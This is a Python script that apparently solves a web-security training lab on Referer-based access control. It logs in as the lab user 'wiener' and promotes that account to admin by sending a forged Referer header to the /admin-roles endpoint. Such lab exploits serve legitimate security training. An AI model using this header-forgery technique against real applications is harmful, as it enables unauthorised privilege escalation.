###################################################################
#
# Lab: Referer-based access control
#
# Hack Steps: 
#      1. Login as wiener
#      2. Upgrade wiener to be an admin by adding Referer header
#
###################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a480059049a34b082e0d3b4008c00d6.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter" }
    login_as_wiener = post_data("/login", data)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Upgrading wiener to be an admin by adding Referer header.. ", end="", flush=True)    
    
    session = login_as_wiener.cookies.get("session") 
    cookies = { "session": session }
    headers = { "Referer": f"{LAB_URL}/admin" }
    fetch("/admin-roles?username=wiener&action=upgrade", cookies=cookies, headers=headers)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies, headers):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)

        
if __name__ == "__main__":
    main()

